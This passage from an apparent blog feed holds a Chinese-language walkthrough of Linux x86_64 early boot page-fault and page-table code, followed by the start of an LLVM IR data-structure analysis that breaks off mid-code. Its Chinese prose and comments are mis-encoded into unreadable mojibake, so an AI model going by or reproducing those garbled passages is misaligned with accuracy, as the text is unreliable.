class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="early-idt-handler-common"><a href="#early-idt-handler-common" class="headerlink" title="early_idt_handler_common"></a>early_idt_handler_common</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>early_idt_handler_common:<br>cld<br><br># early_recursion_flagé¿å…åœ¨early_idt_handler_commonç¨‹åºä¸­é€’å½’åœ°äº§ç”Ÿä¸­æ–­ï¼ˆæœ‰ç‚¹ç±»ä¼¼äºé”ï¼‰<br>incl early_recursion_flag(%rip)<br><br>/* å‹æ ˆé€šç”¨å¯„å­˜å™¨ */<br>pushq %rsi/* pt_regs-&gt;si */<br>movq 8(%rsp), %rsi/* RSI = vector number */<br>movq %rdi, 8(%rsp)/* pt_regs-&gt;di = RDI */<br>pushq %rdx/* pt_regs-&gt;dx */<br>pushq %rcx/* pt_regs-&gt;cx */<br>pushq %rax/* pt_regs-&gt;ax */<br>pushq %r8/* pt_regs-&gt;r8 */<br>pushq %r9/* pt_regs-&gt;r9 */<br>pushq %r10/* pt_regs-&gt;r10 */<br>pushq %r11/* pt_regs-&gt;r11 */<br>pushq %rbx/* pt_regs-&gt;bx */<br>pushq %rbp/* pt_regs-&gt;bp */<br>pushq %r12/* pt_regs-&gt;r12 */<br>pushq %r13/* pt_regs-&gt;r13 */<br>pushq %r14/* pt_regs-&gt;r14 */<br>pushq %r15/* pt_regs-&gt;r15 */<br>UNWIND_HINT_REGS<br><br>cmpq $14,%rsi/* å¦‚æœæ˜¯ç¼ºé¡µä¸­æ–­åˆ™æŠŠcr2å¯„å­˜å™¨ä¸­çš„å€¼èµ‹å€¼ç»™rdiï¼Œç„¶åè°ƒç”¨early_make_pgtable */<br>jnz 10f<br>GET_CR2_INTO(%rdi)<br>call early_make_pgtable<br>andl %eax,%eax<br>jz 20f/* All good */<br><br>10:<br>movq %rsp,%rdi/* RDI = pt_regs; RSI is already trapnr */<br>call early_fixup_exception/* ä¸æ˜¯ç¼ºé¡µä¸­æ–­åˆ™è°ƒç”¨early_fixup_exceptionè¿›è¡Œä¸‹é¢çš„æ­¥éª¤ */<br><br>20:<br>decl early_recursion_flag(%rip)/* è§£é” */<br>jmp restore_regs_and_return_to_kernel/* kerneläººæœ€ç†Ÿæ‚‰çš„å‡½æ•°ï¼ˆï¼Œæ¢å¤å¯„å­˜å™¨å¹¶è¿”å› */<br>END(early_idt_handler_common)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\mm\extable.c</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">early_fixup_exception</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pt_regs *regs, <span class="hljs-type">int</span> trapnr)</span><br>&#123;<br><span class="hljs-comment">/* å¿½ç•¥NMIs */</span><br><span class="hljs-keyword">if</span> (trapnr == X86_TRAP_NMI)<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* æ²¡æœ‰é”ï¼ŒæŒ‚èµ· */</span><br><span class="hljs-keyword">if</span> (early_recursion_flag &gt; <span class="hljs-number">2</span>)<br><span class="hljs-keyword">goto</span> halt_loop;<br><br>    <span class="hljs-comment">/* æ£€æŸ¥cså¯„å­˜å™¨ */</span><br><span class="hljs-keyword">if</span> (!xen_pv_domain() &amp;&amp; regs-&gt;cs != __KERNEL_CS)<br><span class="hljs-keyword">goto</span> fail;<br><br>    <span class="hljs-comment">/* æ‰§è¡Œå¯¹åº”ä¸­æ–­çš„handlerï¼Œä¸å±•å¼€äº† */</span><br><span class="hljs-keyword">if</span> (fixup_exception(regs, trapnr))<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* æŠ¥å‘Šbug */</span><br><span class="hljs-keyword">if</span> (fixup_bug(regs, trapnr))<br><span class="hljs-keyword">return</span>;<br><br>fail:<br>early_printk(<span class="hljs-string">&quot;PANIC: early exception 0x%02x IP %lx:%lx error %lx cr2 0x%lx\n&quot;</span>,<br>     (<span class="hljs-type">unsigned</span>)trapnr, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)regs-&gt;cs, regs-&gt;ip,<br>     regs-&gt;orig_ax, read_cr2());<br><br>show_regs(regs);<br><br>halt_loop:<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>halt();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="early-make-pgtable"><a href="#early-make-pgtable" class="headerlink" title="early_make_pgtable"></a>early_make_pgtable</h3><p>ä¼ ç»™early_make_pgtableçš„å‚æ•°addressæ˜¯cr2çš„å€¼ï¼Œcr2ä¸­å‚¨å­˜çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å¼•èµ·äº†ç¼ºé¡µä¸­æ–­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __init <span class="hljs-title function_">early_make_pgtable</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> physaddr = address - __PAGE_OFFSET;<span class="hljs-comment">// __PAGE_OFFSETè¿™é‡Œæ˜¯0xffffffff80000000ï¼Œè·å–ç‰©ç†åœ°å€</span><br><span class="hljs-type">pmdval_t</span> pmd;<br><br>pmd = (physaddr &amp; PMD_MASK) + early_pmd_flags;<br><br><span class="hljs-keyword">return</span> __early_make_pgtable(address, pmd);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸€äº›å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\pgtable_64_types.h</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pteval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pmdval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pudval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">p4dval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pgdval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pgprotval_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">pteval_t</span> pte; &#125; <span class="hljs-type">pte_t</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EARLY_DYNAMIC_PAGE_TABLES64</span><br><br><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __initdata next_early_pgt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>NEXT_PAGE(early_dynamic_pgts)# ä¸€ä¸ªå›ºå®šå¤§å°ç¼“å†²åŒº<br>.fill512*EARLY_DYNAMIC_PAGE_TABLES,8,0<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br><span class="hljs-type">int</span> __init __early_make_pgtable(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmdval_t</span> pmd)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> physaddr = address - __PAGE_OFFSET;<span class="hljs-comment">// è·å–ç‰©ç†åœ°å€</span><br><span class="hljs-type">pgdval_t</span> pgd, *pgd_p;<span class="hljs-comment">// 17-25ï¼šå…¨å±€é¡µç›®å½•ï¼ˆpgdï¼‰</span><br><span class="hljs-type">p4dval_t</span> p4d, *p4d_p;<span class="hljs-comment">// 5çº§é¡µè¡¨ä½¿ç”¨</span><br><span class="hljs-type">pudval_t</span> pud, *pud_p;<span class="hljs-comment">// 26-34ï¼šä¸Šå±‚é¡µç›®å½•ï¼ˆpudï¼‰</span><br><span class="hljs-type">pmdval_t</span> *pmd_p;<span class="hljs-comment">// 35-43ï¼šä¸­é—´é¡µç›®å½•ï¼ˆpmdï¼‰</span><br><br><span class="hljs-comment">/* éæ³•åœ°å€æˆ–é¡µè¡¨å‡ºé”™  */</span><br><span class="hljs-keyword">if</span> (physaddr &gt;= MAXMEM || read_cr3_pa() != __pa_nodebug(early_top_pgt))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>again:<br>pgd_p = &amp;early_top_pgt[pgd_index(address)].pgd;<br>pgd = *pgd_p;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_X86_5LEVEL))<span class="hljs-comment">// ä¸æ”¯æŒ5çº§é¡µè¡¨åˆ™ç›´æ¥èµ‹å€¼ï¼Œè·å–å¯¹åº”p4dè¡¨</span><br>p4d_p = pgd_p;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pgd)<span class="hljs-comment">// æ”¯æŒ5çº§é¡µè¡¨ä¸”pgdå¯¹åº”è¡¨é¡¹ä¸ä¸ºç©ºåˆ™è·å–p4d</span><br>p4d_p = (<span class="hljs-type">p4dval_t</span> *)((pgd &amp; PTE_PFN_MASK) + __START_KERNEL_map - phys_base);<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (next_early_pgt &gt;= EARLY_DYNAMIC_PAGE_TABLES) &#123;<span class="hljs-comment">// å¦‚æœé‡ç½®æ¬¡æ•°è¶…è¿‡é™å€¼åˆ™é‡æ¥</span><br>reset_early_page_tables();<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br>p4d_p = (<span class="hljs-type">p4dval_t</span> *)early_dynamic_pgts[next_early_pgt++];<span class="hljs-comment">// ä»early_dynamic_pgtsä¸­å–ä¸€é¡¹ç”¨ä½œp4d</span><br><span class="hljs-built_in">memset</span>(p4d_p, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*p4d_p) * PTRS_PER_P4D);<br>*pgd_p = (<span class="hljs-type">pgdval_t</span>)p4d_p - __START_KERNEL_map + phys_base + _KERNPG_TABLE;<span class="hljs-comment">// å¡«å…¥pgdå¯¹åº”è¡¨é¡¹</span><br>&#125;<br>p4d_p += p4d_index(address);<br>p4d = *p4d_p;<span class="hljs-comment">// è·å–å¯¹åº”p4dè¡¨é¡¹ï¼ˆæˆ–pgdï¼‰</span><br><br>    <span class="hljs-comment">// ä»¥ä¸‹ç±»ä¼¼</span><br>    <br><span class="hljs-keyword">if</span> (p4d)<br>pud_p = (<span class="hljs-type">pudval_t</span> *)((p4d &amp; PTE_PFN_MASK) + __START_KERNEL_map - phys_base);<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (next_early_pgt &gt;= EARLY_DYNAMIC_PAGE_TABLES) &#123;<br>reset_early_page_tables();<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br>pud_p = (<span class="hljs-type">pudval_t</span> *)early_dynamic_pgts[next_early_pgt++];<br><span class="hljs-built_in">memset</span>(pud_p, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*pud_p) * PTRS_PER_PUD);<br>*p4d_p = (<span class="hljs-type">p4dval_t</span>)pud_p - __START_KERNEL_map + phys_base + _KERNPG_TABLE;<br>&#125;<br>pud_p += pud_index(address);<br>pud = *pud_p;<br><br><span class="hljs-keyword">if</span> (pud)<br>pmd_p = (<span class="hljs-type">pmdval_t</span> *)((pud &amp; PTE_PFN_MASK) + __START_KERNEL_map - phys_base);<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (next_early_pgt &gt;= EARLY_DYNAMIC_PAGE_TABLES) &#123;<br>reset_early_page_tables();<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br>pmd_p = (<span class="hljs-type">pmdval_t</span> *)early_dynamic_pgts[next_early_pgt++];<br><span class="hljs-built_in">memset</span>(pmd_p, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*pmd_p) * PTRS_PER_PMD);<br>*pud_p = (<span class="hljs-type">pudval_t</span>)pmd_p - __START_KERNEL_map + phys_base + _KERNPG_TABLE;<br>&#125;<br>pmd_p[pmd_index(address)] = pmd;<span class="hljs-comment">// èµ‹å€¼ç‰©ç†åœ°å€+ä¸€äº›æ ‡å¿—</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="copy-bootdata"><a href="#copy-bootdata" class="headerlink" title="copy_bootdata"></a>copy_bootdata</h2><p>ä¸»è¦ä¸æ˜¯è®²è¿™ä¸ªå‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°è§¦å‘äº†ç¼ºé¡µä¸­æ–­ä½¿å¾—é¡µè¡¨å‘ç”Ÿäº†å˜åŒ–</p><p>è°ƒç”¨copy_bootdataæ—¶ä½¿ç”¨äº†ä¸€ä¸ªå®ï¼Œå¯¹real_mode_dataçš„å€¼è¿›è¡Œäº†ä¿®æ­£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">copy_bootdata(__va(real_mode_data));<br><br><span class="hljs-comment">// arch\arm\include\asm\memory.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __va(x)((void *)__phys_to_virt((phys_addr_t)(x)))</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®è°ƒè¯•è¿™ä¸ªå®åº”è¯¥æ˜¯å°†ç‰©ç†åœ°å€è½¬åŒ–ä¸ºäº†çº¿æ€§æ˜ å°„åœ°å€</p><p>æ˜¾ç„¶è¿™æ—¶å€™çš„é¡µè¡¨æ²¡æœ‰è¿™ä¸ªåœ°å€çš„æ˜ å°„ï¼Œæ‰€ä»¥ä¼šè§¦å‘ç¼ºé¡µä¸­æ–­</p>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>boot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LLVM IRæ•°æ®ç»“æ„åˆ†æ</title>
    <link href="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <url>/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>ç ”ç©¶äº†å¥½å‡ å¤©ç»ˆäºææ¸…æ¥šllvmçš„ç»“æ„äº†ï¼Œå…¶å®æ²¡å¿…è¦ä½†â€¦â€¦ä¸€äº›pwnæ‰‹å¯¹æ•°æ®ç»“æ„å’Œå†…å­˜åˆ†å¸ƒçš„æ‰§ç€</p><p>è¿‡ç¨‹åŠå…¶åå·ï¼Œå…‰ç¼–è¯‘ä¸€ä¸ªå¸¦ç¬¦å·çš„.soæ–‡ä»¶å°±ç¼–è¯‘äº†å¥½å‡ æ¬¡(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»ï¼ˆå› ä¸ºæƒ³çœ‹å†…å­˜åˆ†å¸ƒï¼‰</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/wjx.png" class title="wjx"><span id="more"></span><p>å…ˆæ”¾ä¸€å¼ å¤æ‚çš„å›¾ï¼ˆ</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/LLVM-IR.png" class title="LLVM-IR"><h2 id="LLVMContext"><a href="#LLVMContext" class="headerlink" title="LLVMContext"></a>LLVMContext</h2><ul><li><p>ä¸€ä¸ªé»‘ç›’ï¼Œç®¡ç†llvmä¸­åŸºç¡€çš„ã€æ ¸å¿ƒçš„â€œå…¨å±€â€æ•°æ®ï¼Œå¦‚ç±»å‹ã€æ ‡å‡†åŒ–çš„å¸¸é‡è¡¨</p></li><li><p>LLVMContextåŒ…å«äº†llvmåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­æ­£å¸¸è¿è¡Œï¼ˆæ¯”å¦‚ä¸€ä¸ªç¼–è¯‘ä»»åŠ¡ï¼‰æ‰€éœ€è¦çš„æ•°æ®ï¼Œåœ¨è€ç‰ˆæœ¬ä¸­è¿™äº›éƒ½æ˜¯å…¨å±€æ•°æ®ï¼Œç°åœ¨ä»–ä»¬è¢«æ‰“åŒ…æˆäº†ä¸€ä¸ªç±»LLVMContextï¼Œè¿™æ ·llvmå°±å¯ä»¥æ”¯æŒå¤šçº¿ç¨‹çš„ç¼–è¯‘ä»»åŠ¡äº†</p></li><li><p>ä¹‹åä¼šä½œä¸ºä¼ å…¥å‚æ•°å¤šæ¬¡ç”¨åˆ°ï¼Œä¸éœ€è¦å…·ä½“çŸ¥é“æ˜¯ä»€ä¹ˆï¼ˆ</p></li><li><p>Moduleç±»ä¸­æœ‰contextæˆå‘˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Module</span> &#123;  <br><span class="hljs-keyword">private</span>:<br>  LLVMContext &amp;Context;    <br></code></pre></td></tr></table></figure></li><li><p>åˆ›å»ºä¸€ä¸ªLLVMContext</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext &amp; context = llvm::<span class="hljs-built_in">getGlobalContext</span>();<br></code></pre></td></tr></table></figure><ul><li><p>LLVMContextåˆ é™¤äº†æ‹·è´æ„é€ å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">LLVMContext</span>(LLVMContext &amp;) = <span class="hljs-keyword">delete</span>;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¸è¡Œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext context1;<br><span class="hljs-function">LLVMContext <span class="hljs-title">context2</span><span class="hljs-params">(context1)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p>LLVMContextåˆ é™¤äº†æ‹·è´èµ‹å€¼è¿ç®—ç¬¦</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext &amp;<span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> LLVMContext &amp;) = <span class="hljs-keyword">delete</span>;<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¼šä¸è¡Œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext context1;<br>LLVMContext context2;<br>context2 = context1<br></code></pre></td></tr></table></figure><p>è¦æ³¨æ„ä½¿ç”¨å¼•ç”¨</p></li></ul></li></ul><h1 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h1><p>ä¸€äº›ç¢ç¢å¿µï¼šc++å¤ªæ¶å¿ƒäº†ï¼ŒåµŒå¥—nå±‚ç±»å°±æ˜¯ä¸€ä¸ªåŒé“¾è¡¨</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/%E6%81%B6%E5%BF%83%E7%9A%84c++.png" class title="æ¶å¿ƒçš„c++"><p>Moduleä¸»è¦çš„æˆå‘˜ä¸»è¦æ˜¯å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä¸¤ä¸ªé“¾è¡¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Module</span> &#123;<br>  <span class="hljs-keyword">using</span> GlobalListType = SymbolTableList&lt;GlobalVariable&gt;;<br>  <span class="hljs-keyword">using</span> FunctionListType = SymbolTableList&lt;Function&gt;;<br>    <br><span class="hljs-keyword">private</span>:<br>  GlobalListType GlobalList;<br>  FunctionListType FunctionList; <br></code></pre></td></tr></table></figure><p>å†…å­˜åˆ†å¸ƒå¤§æ¦‚é•¿è¿™æ ·ğŸ‘‡</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/Module.png" class title="Module"><h2 id="åˆ›å»ºä¸€ä¸ªModule"><a href="#åˆ›å»ºä¸€ä¸ªModule" class="headerlink" title="åˆ›å»ºä¸€ä¸ªModule"></a>åˆ›å»ºä¸€ä¸ªModule</h2><p>åˆ›å»ºä¸€ä¸ªModuleï¼Œéœ€è¦ä¸€ä¸ªåå­—å’Œä¸€ä¸ªLLVMContext</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">Module</span>(StringRef ModuleID, LLVMContext&amp; C);<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext &amp; context = llvm::<span class="hljs-built_in">getGlobalContext</span>();<br>Module* <span class="hljs-keyword">module</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Module</span>(<span class="hljs-string">&quot;test&quot;</span>, context);<br></code></pre></td></tr></table></figure><h2 id="è¿­ä»£å™¨"><a href="#è¿­ä»£å™¨" class="headerlink" title="è¿­ä»£å™¨"></a>è¿­ä»£å™¨</h2><ul><li><p>Function</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// @&#125;</span><br><span class="hljs-comment">/// @name Function Iteration</span><br><span class="hljs-comment">/// @&#123;</span><br><br>  <span class="hljs-function">iterator                <span class="hljs-title">begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">const_iterator          <span class="hljs-title">begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">iterator                <span class="hljs-title">end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">end</span>();   &#125;<br>  <span class="hljs-function">const_iterator          <span class="hljs-title">end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">end</span>();   &#125;<br>  <span class="hljs-function">reverse_iterator        <span class="hljs-title">rbegin</span><span class="hljs-params">()</span>      </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rbegin</span>(); &#125;<br>  <span class="hljs-function">const_reverse_iterator  <span class="hljs-title">rbegin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rbegin</span>(); &#125;<br>  <span class="hljs-function">reverse_iterator        <span class="hljs-title">rend</span><span class="hljs-params">()</span>        </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rend</span>(); &#125;<br>  <span class="hljs-function">const_reverse_iterator  <span class="hljs-title">rend</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>  </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rend</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">size_t</span>                  <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>  </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">size</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">bool</span>                    <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">empty</span>(); &#125;<br><br>  <span class="hljs-function">iterator_range&lt;iterator&gt; <span class="hljs-title">functions</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span 